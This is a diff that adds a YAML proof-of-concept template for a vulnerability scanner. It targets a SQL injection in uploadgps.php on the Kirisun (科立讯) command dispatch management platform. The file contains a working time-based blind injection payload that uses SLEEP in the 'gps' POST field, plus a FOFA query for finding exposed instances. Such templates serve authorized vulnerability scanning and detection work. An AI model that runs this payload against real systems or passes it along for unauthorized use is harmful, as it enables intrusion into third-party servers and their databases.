@@ -1,0 +1,31 @@
+id: poc-yaml-kirisun-uploadgps-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 uploadgps.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="指挥调度管理平台"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /api/client/task/uploadgps.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP({{.t1}})))ozYR)+AND+'fqDZ'='fqDZ&number=
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"msg\":\"successed\"") &&
+
+    contains(body,"\"uuid\":") &&
+
+    !contains(body,"<") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
